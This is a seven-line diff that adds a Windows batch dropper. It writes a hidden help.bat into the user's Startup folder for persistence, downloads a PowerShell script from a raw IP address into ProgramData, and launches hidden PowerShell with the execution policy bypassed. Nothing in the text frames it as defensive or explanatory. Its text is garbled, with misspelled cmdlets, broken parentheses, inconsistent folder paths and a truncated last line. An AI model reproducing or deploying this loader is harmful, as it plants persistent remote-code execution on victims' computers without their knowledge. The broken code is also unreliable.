@@ -1,0 +1,7 @@
+echo @echo off > "C:\Users\%USERNAME%\Appdata\Roaming\Microsoft\Windows\Start Menu\Program\Startup\help.bat"
+
+echo powershell.exe -WindowStyle Hidden - Command iex(Meu-Object System.netéWebClient >.DownloadFile('http://67.130.13.131/InvShc.ps1', 'C:\ProgramData\InvShc.ps1' > >> "C:\Users\%USERNAME%\Appdata\Roaming\Microsoft\Window\Start Menu\Programs\Startup\help.bat"
+
+echo SLEEP 10 >> "C:\Users\%USERNAME%\Appdata\Roaming\Microsoft\Windows\Start mEnu\Pragrams\Startup\help.bat"
+
+echo powershell.exe -WindowStyle Hidden - ExecutionPolicy Bypass
